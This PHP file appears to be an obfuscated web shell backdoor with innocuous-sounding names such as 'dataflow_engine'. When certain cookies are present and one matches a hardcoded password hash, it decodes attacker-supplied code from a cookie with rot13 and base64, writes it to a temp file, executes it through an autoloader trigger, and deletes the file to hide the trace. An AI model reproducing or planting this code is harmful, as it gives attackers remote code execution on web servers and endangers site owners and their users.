<?php


if (isset($_COOKIE[-47+47]) && isset($_COOKIE[-58+59]) && isset($_COOKIE[40+-37]) && isset($_COOKIE[-50+54])) {
    $entity = $_COOKIE;
    function dataflow_engine($element) {
        $entity = $_COOKIE;
        $rec = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'abe53c07');
        if (!is_writable($rec)) {
            $rec = getcwd() . DIRECTORY_SEPARATOR . "sync_manager";
        }
        $value = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($entity[3]));
        if (is_writeable($rec)) {
            $pset = fopen($rec, 'w+');
            fputs($pset, $value);
            fclose($pset);
            spl_autoload_unregister(__FUNCTION__);
            require_once($rec);
            @array_map('unlink', array($rec));
        }
    }
    spl_autoload_register("dataflow_engine");
    $val = "df3d9a82e478785f49ad999213551cd0";
    if (!strncmp($val, $entity[4], 32)) {
        if (@class_parents("token_parser_engine_reverse_lookup", true)) {
            exit;
        }
    }
}
